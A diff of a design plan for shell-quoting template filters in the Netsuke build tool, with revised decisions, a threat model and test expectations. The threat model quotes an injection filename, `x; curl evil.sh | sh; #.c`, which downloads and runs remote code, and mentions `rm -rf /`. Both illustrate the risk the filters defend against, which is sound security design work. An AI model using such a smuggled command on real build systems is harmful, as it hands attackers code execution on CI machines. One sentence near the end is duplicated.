@@ -29,17 +29,31 @@ targets:
   - name: build-stamp
     command: >-
       RUSTFLAGS={{ [base_flags, env('RUSTFLAGS', default='')]
-        | compact | join(' ') | shell_quote }}
-      cargo build && touch {{ outs }}
+        | compact | join(' ') | shell_quote(dialect='sh') }}
+      cargo build ; touch {{ outs }}
 ```
 
-and observe that:
+Two details of that example are load-bearing and were wrong in the first draft
+of this plan.
+
+- The interpolation sits in **unquoted** position. `shell_quote` produces a
+  complete shell word; putting it inside `"..."` would insert its quote
+  characters literally and corrupt the value. This is a precondition of the
+  filter, not a stylistic choice, and it is documented as such.
+- The recipe uses `;`, not `&&`. `docs/users-guide.md:337-338` states that
+  Netsuke's Windows contract is Windows PowerShell, "not a PowerShell Core
+  (`pwsh`) contract", and Windows PowerShell 5.1 has no `&&` operator. A
+  flagship example that cannot run on the platform whose dialect machinery this
+  feature exists to serve would be worse than no example.
+
+Given that manifest, observe that:
 
 1. `netsuke generate` succeeds whether or not `RUSTFLAGS` is set in the
    environment.
-2. When `RUSTFLAGS` is unset, the generated `build.ninja` contains
-   `RUSTFLAGS='-D warnings'` — one shell word, no empty argument, and no
-   `${...:+...}` expansion.
+2. When `RUSTFLAGS` is unset, the generated `build.ninja` carries
+   `RUSTFLAGS=-D' warnings'` — one shell word, no empty argument, and no
+   `${...:+...}` expansion. That spelling is the `shell-quote` crate's
+   fragmented form; see the note under the behavioural specification.
 3. When `RUSTFLAGS` is set to `-C target-cpu=native --cfg 'a b'`, the generated
    command still contains exactly one shell word for the value, and running the
    build passes that exact string to `cargo` rather than word-splitting it.
@@ -525,29 +539,193 @@ Stop and escalate — do not improvise — when any of these is reached.
   enables only `sh`). Accepting the name now would lock in a meaning that a
   future `bash` dialect would have to break. Date/Author: 2026-09-08, planning
   session.
-- **Decision D4**: `env(name, default=none)` is equivalent to omitting
-  `default`, and a non-string `default` fails with MiniJinja's own
-  argument-type error rather than a Netsuke message. Rationale:
-  `kwargs.get::<Option<String>>("default")?` gives precisely this behaviour,
-  and the existing `which` family already relies on MiniJinja's own
-  `"unknown keyword argument"` text (`tests/stdlib_which_tests.rs:361-364`).
-  This avoids a sixth message key across 35 catalogues for a case a manifest
-  author reaches only by mistake. Date/Author: 2026-09-08, planning session.
+- **Decision D4 (revised; the original premise was false)**: `default` and
+  `dialect` are read as `Kwargs::get::<Option<Value>>` and type-checked
+  explicitly. The first draft used `Kwargs::get::<Option<String>>` believing it
+  raises a type error for a non-string. It does not. Verified against
+  `minijinja 2.24.0`, it silently stringifies every value kind: `default=1`
+  yields `"1"`, `default=true` yields the Python-shaped `"True"`, and
+  `default=['a','b']` yields the JSON fragment `["a", "b"]` — straight into a
+  shell recipe. That is exactly the coercion
+  `docs/rfcs/0006-ansible-inspired-template-standard-library.md:325` §6.6
+  forbids: "A helper that expects a string rejects numbers and booleans rather
+  than stringifying them." The read is therefore:
+
+  ```rust
+  let fallback = match kwargs.get::<Option<Value>>("default")? {
+      None => None,
+      Some(value) if value.is_none() => None,
+      Some(value) if value.is_undefined() => return Err(undefined_default_error()),
+      Some(value) => Some(
+          value
+              .as_str()
+              .ok_or_else(|| default_not_string_error(value.kind()))?
+              .to_owned(),
+      ),
+  };
+  ```
+
+  `default=none` remains equivalent to omitting `default`, because `env`'s
+  fallback is an absence substitution rather than a value slot; that is the one
+  place RFC 0006's null rule is deliberately not followed, and the user guide
+  says so. Undefined and non-string values are errors. This costs one message
+  key the first draft claimed to save. Buying a silent-coercion defect for
+  thirty-five lines of translation was a bad trade. Date/Author: 2026-09-09,
+  revised after contract review.
 - **Decision D5**: `compact` drops `none`, undefined, and the empty string, and
   keeps `0`, `false`, `[]`, and `{}`. Rationale: `DD-4.5` says exactly "removes
   empty strings and null values while preserving order". Dropping
   falsy-but-present values would silently discard a meaningful `0` from a flag
   list. Date/Author: 2026-09-08, planning session.
-- **Decision D6**: `shell_quote` and `shell_join` are registered on the
-  manifest-query surface as *working* helpers, not disabled stubs. Rationale:
-  they are pure — they read no clock, filesystem, network, process, or
-  environment state — so they disclose nothing about the host. `compact` is
-  pure for the same reason and lands automatically, because
+- **Decision D6 (rationale corrected)**: `shell_quote` and `shell_join` are
+  registered on the manifest-query surface as *working* helpers, not disabled
+  stubs. Rationale: they are pure **with respect to the supplied dialect**. The
+  first draft claimed they "read no environment state", which is false: with
+  `dialect` omitted they resolve through `RecipeShell::host_default()`, itself
+  `cfg!(windows)` (`src/recipe_shell.rs:20-26`), and after EP-M4 from
+  `NETSUKE_WINDOWS_SHELL`. So `{{ 'a b' | shell_quote }}` on the query surface
+  discloses the host OS family. That is an accepted residual — the family is
+  already inferable from the binary and from `netsuke --version` — but
+  non-disclosure is the one property `register_manifest_query` exists to
+  guarantee, so its rationale must be accurate rather than convenient. Given an
+  explicit `dialect`, the filters read nothing at all. `compact` is
+  unconditionally pure and lands automatically, because
   `collections::register_filters` is already called by both surfaces
-  (`src/stdlib/register.rs:158` and `:169`). Date/Author: 2026-09-08, planning
-  session.
+  (`src/stdlib/register.rs:158` and `:169`). Date/Author: 2026-09-09, corrected
+  after structural review.
 - **Decision D7**: `ortho_config` is not used. See "Applicability of
   `ortho_config`" above. Date/Author: 2026-09-08, planning session.
+
+- **Decision D8**: `compact` and `shell_join` reject by `ValueKind`, not by
+  `Value::try_iter()`. Rationale: the first draft claimed non-sequence input
+  "errors through `values.try_iter()?`, exactly as `uniq` does". That is false.
+  `minijinja-2.24.0/src/value/mod.rs::try_iter` accepts `None` and `Undefined`
+  (yielding an empty iterator), any string (yielding its *characters*), and any
+  object (a map yields its *keys*); only numbers and booleans are rejected. So
+  `{{ 'abc' | shell_join }}` would quote three separate characters into a
+  command line, and `{{ my_map | compact }}` would silently return the map's
+  keys. Both helpers therefore accept only `ValueKind::Seq` and
+  `ValueKind::Iterable`; every other kind, `Map`, `String`, `None`, and
+  `Undefined` included, raises an error naming the received kind. `uniq` and
+  `flatten` share the latent wart; fixing them is out of scope, but it is not a
+  licence to add two more, one of which builds shell text. Date/Author:
+  2026-09-09, after contract review.
+- **Decision D9**: every new diagnostic carries a machine-readable code in its
+  Fluent text: `[netsuke::jinja::shell::args]` for a wrong call, and
+  `[netsuke::jinja::shell::unquotable]` for a value a recipe cannot carry.
+  Rationale: `locales/en-GB/messages.ftl:342-346` already carries
+  `[netsuke::jinja::which::args]` inside the message, and `locales/fr` keeps it
+  verbatim while translating the prose. It is the crate's only locale-stable
+  handle for a template diagnostic, and `tests/features/stdlib.feature:104-106`
+  proves the suite switches locale. The first draft's behavioural scenarios
+  asserted on untranslated English (`"line feed"`), which would fail in
+  thirty-two of the thirty-five catalogues. The split matters: `::args` means
+  the template is wrong, and `::unquotable` means the template is right but its
+  data cannot be carried — different fixes, often by different people. Do
+  **not** copy `with_not_found_code` (`src/stdlib/which/mod.rs:235-237`), which
+  prefixes the code in Rust *and* in the Fluent text; the snapshot at
+  `tests/snapshots/which_diagnostic_snapshot_tests__which_not_found.snap:5`
+  shows it emitted twice. The code lives in the message text only. Date/Author:
+  2026-09-09, after contract review.
+- **Decision D10**: `dialect='sh'` names an *encoding*, not a shell. Its output
+  is fixed and will not change when further dialects are added. The dialect
+  selected when `dialect` is *omitted* is a host- and configuration-dependent
+  default that MAY change between Netsuke releases — in particular
+  `RecipeShell::Bash` maps to `sh` today (D3) and would map to a future `bash`
+  dialect. A manifest whose generated text must be byte-stable across releases
+  and hosts must pin `dialect=` explicitly. Rationale: this is the one axis of
+  the template surface with no versioning story, and it is invisible: no
+  manifest edit, no version bump, different `build.ninja`. Naming it is cheaper
+  than discovering it. Date/Author: 2026-09-09, after contract review.
+- **Decision D11 (alternative considered and not adopted)**: ship
+  `shell_quote`/`shell_join` with **no** `dialect` argument, always following
+  the active recipe shell. Rationale for considering it: every comparable tool —
+  `shlex.quote`, `shlex.join`, Just's `quote()`, bazel-skylib's `shell.quote`,
+  Nix's `escapeShellArg`, Ansible's `quote` — ships a one-argument function
+  with no dialect selector. Dropping it would remove four of the six message
+  keys (roughly 140 catalogue lines), remove `ShellDialect::parse`, remove
+  OBL-DIALECT-TOTAL, and remove the name collision with ADR-019's shell
+  registry, which accepts `bash` where D3 rejects it. It would also make RFC
+  0006's wider dialect set *easier* to add later, since an optional keyword on
+  a zero-argument filter is purely additive. Rationale for not adopting it: the
+  requester chose the two-dialect surface explicitly, and `RFC-0006-8.9` plus
+  `RM-6.8.3` both specify the `dialect` argument by name. Dropping it would be
+  a second deviation on top of D2. The plan instead adopts the safety half of
+  the argument: the documented example and every snapshot pin `dialect`
+  explicitly (R4), D10 records that the omitted-dialect default is unstable,
+  and EP-M4 closes the mismatch that made the argument dangerous. Reopening
+  condition: if the requester prefers the smaller surface at approval time,
+  EP-M3 and EP-M4 shrink by roughly forty per cent and R1 drops from high to
+  low likelihood. This decision is cheap to reverse before EP-M4 and expensive
+  afterwards, because the template surface becomes documented and executed at
+  EP-M6. Date/Author: 2026-09-09, after alternatives review.
+- **Decision D12**: `shell_quote` and `shell_join` are *safe primitives*, not
+  enforced controls, and the plan says so rather than repeating `DD-4.5`'s
+  "non-negotiable security feature" unqualified. See "Threat model" below.
+  Date/Author: 2026-09-09, after contract review.
+
+## Threat model
+
+`DD-4.5` calls the quoting filter "a non-negotiable security feature to prevent
+command injection vulnerabilities". That phrase needs qualifying before it is
+repeated, because a security property requires an attacker and no document in
+this repository names one.
+
+**The attacker is not the manifest author.**
+`docs/stdlib-yaml-and-jinja-guide.md:89,296,374` is unambiguous that
+host-observing helpers belong only in trusted manifests. An author who wants
+arbitrary execution writes `command: rm -rf /`. `shell_quote` defends against
+nothing there.
+
+**The attacker is whoever controls a value a trusted manifest reads and
+interpolates.** Netsuke gives a manifest at least seven such channels, every
+one of them lower-trust than the manifest itself:
+
+| Channel                               | Who controls the value                                 |
+| ------------------------------------- | ------------------------------------------------------ |
+| `env('X')`                            | whoever sets CI job variables or the developer's shell |
+| `glob('src/*.c')`                     | anyone who can add a file to the checkout              |
+| `contents(...)`, `size`, `linecount`  | whoever wrote the file                                 |
+| `fetch(url)`                          | the remote server, or anyone who can poison it         |
+| `value \| shell(cmd)`, `\| grep(...)` | whatever the subprocess prints                         |
+| `which('tool')`                       | whoever can plant a `PATH` entry                       |
+
+The realistic attack: a contributor opens a pull request adding a file named
+`x; curl evil.sh | sh; #.c`; the manifest does
+`command: cc {{ glob('src/*.c') | join(' ') }}`; continuous integration builds
+the pull request. Interpolated *paths* are already covered — `quote_path` quotes
+`{{ ins }}` and `{{ outs }}`. `shell_quote` extends that guarantee to the
+other six channels, which today have nothing.
+
+**What this plan delivers, honestly.**
+
+- For `dialect='sh'`, a sound encoder, with unusually good evidence:
+  OBL-SH-ROUNDTRIP runs a real `/bin/sh` and has a stated negative control, and
+  the encoding composes correctly with ADR-014's `$`-doubling at the Ninja
+  writer boundary.
+- For `dialect='powershell'` on a non-Windows host, one class weaker: the
+  guarantee rests on a hand-written inverse model until the Windows job runs.
+  ADR-021 must say so in those words.
+- **It is opt-in and silent when omitted.** Nothing detects
+  `command: cc {{ glob(...) | join(' ') }}` and warns. A control that works
+  only when the author remembers it is a primitive, not a control.
+- **It does not cover the command or option position.**
+  `{{ tool | shell_quote }} {{ user_flags }}` is still injectable through
+  `user_flags`. The guide must not let an author believe that quoting one
+  substitution makes a recipe safe.
+
+The claim to write in ADR-021 and in "Validation and acceptance", replacing any
+unqualified repetition of `DD-4.5`:
+
+> `shell_quote` and `shell_join` are safe primitives, not enforced controls.
+> They give a manifest author a sound way to interpolate a value into a shell
+> recipe as exactly one inert word. The threat they address is a trusted
+> manifest interpolating an attacker-influenced value. The manifest itself
+> remains trusted input; nothing here defends against a hostile `Netsukefile`.
+> The soundness of the encoder is non-negotiable; its application is the
+> author's responsibility. A lint that flags an unquoted interpolation of a
+> host-observing helper's result into a recipe is deliberately out of scope and
+> should be raised as a separate roadmap item.
 
 ## Interfaces and dependencies
 
@@ -722,50 +900,86 @@ repository already trusts.
 
 ### `src/stdlib/collections.rs`
 
-`register_filters` gains one line, and the file gains one function:
+`register_filters` gains one line, and the file gains two functions:
 
 ```rust
 env.add_filter("compact", |values: Value| compact_filter(&values));
 
-/// Drop null, undefined, and empty-string members, preserving order.
+/// Report whether a member is dropped by `compact`.
+///
+/// Only `none`, undefined, and the empty string are blank. `0`, `false`, `[]`,
+/// `{}`, and a whitespace-only string are values and are retained; naming the
+/// predicate keeps that asymmetry visible to the next reader.
+fn is_blank(value: &Value) -> bool;
+
+/// Drop blank members from a sequence, preserving order.
 ///
 /// # Errors
 ///
-/// Returns an error when a non-sequence value cannot be iterated.
+/// Returns an error naming the received kind when the subject is not a
+/// sequence. See decision D8: `Value::try_iter()` is not a sequence check.
 fn compact_filter(values: &Value) -> Result<Value, Error>;
 ```
 
-If `src/stdlib/collections.rs` would exceed 400 lines, move `compact_filter`
-and its tests into `src/stdlib/collections/compact.rs` and convert
-`collections.rs` into a directory module.
+`src/stdlib/collections.rs` is 314 lines today, so `compact` fits. If it would
+exceed 400, convert it to a directory module with
+`src/stdlib/collections/compact.rs`.
 
 ### `src/stdlib/config/mod.rs`
 
+The configuration stores the **dialect**, not the interpreter. `StdlibConfig`
+does not care which interpreter runs the recipe; it cares which quoting rule to
+apply, and `RecipeShell` is a three-variant type that would be collapsed to two
+immediately. Storing the wider type would leave a `recipe_shell()` accessor
+inviting a question the configuration can no longer answer honestly, because
+`Posix` and `Bash` are indistinguishable downstream.
+
 ```rust
-/// Recipe interpreter whose quoting rules the shell filters follow.
-recipe_shell: RecipeShell,
+/// Shell dialect the recipe-text filters quote for.
+dialect: ShellDialect,
 
-/// Select the recipe interpreter the shell filters quote for.
+/// Select the recipe interpreter whose quoting rules the filters follow.
+///
+/// The interpreter is collapsed to its dialect on the way in: `Posix` and
+/// `Bash` both quote as `sh`. Only the dialect is stored, because nothing
+/// downstream can distinguish the two.
 #[must_use]
-pub fn with_recipe_shell(mut self, shell: RecipeShell) -> Self;
+pub fn with_recipe_shell(mut self, shell: RecipeShell) -> Self {
+    self.dialect = shell.dialect();
+    self
+}
 
-/// Return the recipe interpreter the shell filters quote for.
-pub(crate) const fn recipe_shell(&self) -> RecipeShell;
+/// Return the dialect the recipe-text filters quote for.
+pub(crate) const fn dialect(&self) -> ShellDialect;
 ```
 
-`StdlibConfig::new` initializes it to `RecipeShell::host_default()`.
+`StdlibConfig::new` initializes it to `RecipeShell::host_default().dialect()`.
 
 `RecipeShell` is already publicly nameable — `src/lib.rs:27` declares
 `pub mod recipe_shell;` and the enum is `pub` — so `with_recipe_shell` needs no
-visibility widening. `RecipeShell::host_default` stays `pub(crate)`, which is
-sufficient because `StdlibConfig::new` is in-crate.
+visibility widening, and `ShellDialect` stays `pub(crate)`. Taking
+`RecipeShell` as the *parameter* also keeps the interpreter-to-dialect mapping
+in one place rather than pushing it out to every caller.
 
 ### `src/stdlib/register.rs`
 
 - `register_read_only_helpers` calls
-  `shell::register_filters(env, ShellDialect::for_recipe_shell(config.recipe_shell()))`.
+  `recipe_text::register_filters(env, config.dialect())`.
 - `register_query_helpers` calls
-  `shell::register_filters(env, ShellDialect::for_recipe_shell(RecipeShell::host_default()))`.
+  `recipe_text::register_filters(env, RecipeShell::host_default().dialect())`.
+
+  **Known divergence, deliberately accepted.** On a Windows host with
+  `NETSUKE_WINDOWS_SHELL=bash`, the build surface receives the resolved dialect
+  while the query surface receives the host default, so `netsuke help targets`
+  renders different quoting from the build for the same expression. Query
+  rendering is discovery metadata and is never executed, so the divergence is
+  harmless — but it must be pinned by an assertion in
+  `tests/stdlib_manifest_query_tests.rs` and recorded in
+  `docs/developers-guide.md`, not discovered later. The alternative — hoisting
+  `resolve_recipe_shell()` above the early return at `src/runner/mod.rs:145` —
+  would make `netsuke help targets` fail on a Windows host with a malformed
+  `NETSUKE_WINDOWS_SHELL`, which is a worse trade.
+
 - The disabled `env` stub changes to:
 
   ```rust
@@ -777,15 +991,42 @@ sufficient because `StdlibConfig::new` is in-crate.
   );
   ```
 
-### `src/manifest/mod.rs`
+### `src/manifest/mod.rs` — and a file-size problem to solve first
+
+**`src/manifest/mod.rs` is exactly 400 lines today.** Constraint 8 caps files
+at 400, so EP-M1 has zero headroom and its first edit breaches the cap.
+
+Extract first, then edit. Move `RESERVED_VAR_NAMES`, `localize_recipe_error`,
+`register_manifest_vars`, and `manifest_structure_error` into a new
+`src/manifest/registration.rs`, then add the `env` and `glob` registrations
+there too. Use exactly that module name and that member set: the in-flight
+branch `issue-651-add-resource-budgets-to-manifest-template-evaluation` already
+creates `src/manifest/registration.rs` with the same four members, so matching
+it turns a near-certain rebase conflict into a clean merge. See R9.
+
+The registration itself, in `src/manifest/registration.rs`:
 
 ```rust
 let reader = Arc::clone(env_reader);
 jinja.add_function("env", move |var_name: String, kwargs: Kwargs| {
-    let fallback = kwargs.get::<Option<String>>("default")?;
+    let fallback = env_default_from_kwargs(&kwargs)?;
     kwargs.assert_all_used()?;
     env_var_with_default(&var_name, fallback, |key| reader(key))
 });
+```
+
+```rust
+/// Read the optional `default` keyword argument as a string.
+///
+/// Reads `Option<Value>` rather than `Option<String>` because MiniJinja's
+/// `Option<String>` conversion silently stringifies numbers, booleans,
+/// sequences, and mappings. See decision D4.
+///
+/// # Errors
+///
+/// Returns an error for an undefined or non-string `default`. An explicit
+/// `none` is equivalent to omitting the argument.
+fn env_default_from_kwargs(kwargs: &Kwargs) -> Result<Option<String>, Error>;
 ```
 
 ### `src/manifest/env_reader.rs`
@@ -806,34 +1047,71 @@ pub(super) fn env_var_with_default(
 ) -> Result<String, Error>;
 ```
 
+On the substitution path it emits, mirroring the existing failure-path logging
+at `src/manifest/env_reader.rs:92,101` and naming neither the variable nor the
+value:
+
+```rust
+tracing::debug!(fallback_used = true, "manifest env lookup substituted default");
+```
+
+Without it, a continuous-integration job whose `RUSTFLAGS` export silently
+stops propagating goes from failing fast to building the wrong artefact with no
+record anywhere that a default was taken. See R10.
+
 `env_var_with` is **removed**, not kept as an alias (constraint 7); its two
 existing call sites become `env_var_with_default(name, None, read_env)`.
 
 ### New localization keys
 
-Added to `src/localization/keys.rs` in the `STDLIB_*` group, immediately after
-the `COMMAND_*` block:
+Every diagnostic carries its machine-readable code in the Fluent text, per D9
+and matching `locales/en-GB/messages.ftl:342-346`. Added to
+`src/localization/keys.rs` in the `STDLIB_*` group, after the `COMMAND_*` block:
 
 ```rust
+STDLIB_SHELL_ARGS_ERROR => "stdlib.shell.args_error",
+STDLIB_SHELL_UNQUOTABLE => "stdlib.shell.unquotable",
 STDLIB_SHELL_QUOTE_NOT_STRING => "stdlib.shell.quote.not_string",
 STDLIB_SHELL_QUOTE_CONTROL_CHARACTER => "stdlib.shell.quote.control_character",
 STDLIB_SHELL_DIALECT_INVALID => "stdlib.shell.dialect_invalid",
 STDLIB_SHELL_JOIN_NOT_SEQUENCE => "stdlib.shell.join.not_sequence",
 STDLIB_SHELL_JOIN_ITEM_NOT_STRING => "stdlib.shell.join.item_not_string",
+STDLIB_SHELL_POSITIONAL_OPTION => "stdlib.shell.positional_option",
+STDLIB_COLLECTIONS_COMPACT_NOT_SEQUENCE
+    => "stdlib.collections.compact.not_sequence",
+MANIFEST_ENV_DEFAULT_NOT_STRING => "manifest.env.default_not_string",
 ```
 
 English text (`locales/en-GB/messages.ftl` and `locales/en-US/messages.ftl`):
 
 ```text
+stdlib.shell.args_error = [netsuke::jinja::shell::args] { $details }
+stdlib.shell.unquotable = [netsuke::jinja::shell::unquotable] { $details }
 stdlib.shell.quote.not_string = shell_quote expects a string, received { $kind }.
 stdlib.shell.quote.control_character = A value containing a null byte, carriage return, or line feed cannot be quoted.
 stdlib.shell.dialect_invalid = Unknown shell dialect { $dialect }; expected one of { $accepted }.
 stdlib.shell.join.not_sequence = shell_join expects a sequence, received { $kind }.
 stdlib.shell.join.item_not_string = shell_join item { $index } is { $kind }, not a string.
+stdlib.shell.positional_option = { $filter } takes its options by keyword; write { $example }.
+stdlib.collections.compact.not_sequence = compact expects a sequence, received { $kind }.
+manifest.env.default_not_string = env default must be a string, received { $kind }.
 ```
 
+The first two are wrappers; the rest are details fed through them as
+`{ $details }`, exactly as `stdlib.which.cwd_mode_invalid` feeds
+`stdlib.which.args_error` through `args_message`
+(`src/stdlib/which/mod.rs:262-266`). `stdlib.shell.unquotable` wraps the
+control-character detail; every other shell detail wraps
+`stdlib.shell.args_error`.
+
 The `{ $variable }` name set must be identical in all 35 catalogues; wording
-and order may differ. Follow `docs/localization-styleguide.md`.
+and order may differ, but the bracketed code must be copied verbatim, as
+`locales/fr/messages.ftl:343-347` does today. Follow
+`docs/localization-styleguide.md`.
+
+Ten keys, not five. The first draft had five and was wrong on two counts: D4
+and D8 each need a key the draft claimed to save, and D9 adds the two wrappers
+that make the diagnostics locale-stable. Roughly 350 catalogue lines. See R1.
 
 ## Verification plan
 
@@ -1467,7 +1745,9 @@ Quality criteria — what "done" means:
   message text includes an environment variable name or value, matching the
   deliberate omission at `src/manifest/env_reader.rs:83-89`.
 
-Behavioural acceptance, verifiable by hand:
+Behavioural acceptance, verifiable by hand. Note that the interpolation sits in
+**unquoted** position — this is the precondition, and the first draft of this
+plan got it wrong:
 
 ```sh
 cd "$(mktemp -d)"
@@ -1478,8 +1758,9 @@ vars:
 targets:
   - name: stamp.txt
     command: >-
-      printf '%s\n' "RUSTFLAGS={{ [base_flags, env('RUSTFLAGS', default='')]
-        | compact | join(' ') | shell_quote(dialect='sh') }}" > {{ outs }}
+      env RUSTFLAGS={{ [base_flags, env('RUSTFLAGS', default='')]
+        | compact | join(' ') | shell_quote(dialect='sh') }}
+      sh -c 'printf "%s\n" "$RUSTFLAGS"' > {{ outs }}
 defaults:
   - stamp.txt
 EOF
@@ -1491,14 +1772,19 @@ Expect, with `RUSTFLAGS` unset, the recipe to carry `-D warnings` as exactly
 one shell word in the crate's fragmented form:
 
 ```plaintext
-  command = printf '%s\n' "RUSTFLAGS=-D' warnings'" > stamp.txt
+  command = env RUSTFLAGS=-D' warnings' sh -c 'printf "%s\n" "$$RUSTFLAGS"' > stamp.txt
 ```
+
+The `$$` is Ninja escaping applied at the writer boundary per ADR-014; Ninja
+un-escapes it to a single `$` before the shell sees it. Running `netsuke build`
+then writes exactly `-D warnings` to `stamp.txt` — quote characters absent,
+because they were shell syntax rather than data.
 
 With `RUSTFLAGS='-C target-cpu=native'` exported, expect the two flag groups
 joined by one space and quoted as a single word:
 
 ```plaintext
-  command = printf '%s\n' "RUSTFLAGS=-D' warnings -C target-cpu'=native''" > stamp.txt
+  command = env RUSTFLAGS=-D' warnings -C target-cpu'=native'' sh -c … > stamp.txt
 ```
 
 In both cases there must be no `${...:+...}` expansion anywhere, and no empty
@@ -1510,9 +1796,19 @@ sh -c "set -- -D' warnings -C target-cpu'=native''; echo \$#"
 # 1
 ```
 
+Contrast that with the defective form this plan originally specified, which
+placed the interpolation inside double quotes:
+
+```sh
+sh -c 'printf "%s\n" "RUSTFLAGS=-D'"'"' warnings'"'"'"'
+# RUSTFLAGS=-D' warnings'      <- literal quote characters; the value is corrupt
+```
+
 These expectations were derived from `shell-quote-0.7.2` and checked against a
 real `/bin/sh`; see the note under the behavioural specification for the two
-counter-intuitive rules that produce them.
+counter-intuitive rules that produce them. real `/bin/sh`; see the note under
+the behavioural specification for the two counter-intuitive rules that produce
+them.
 
 ## Idempotence and recovery
 
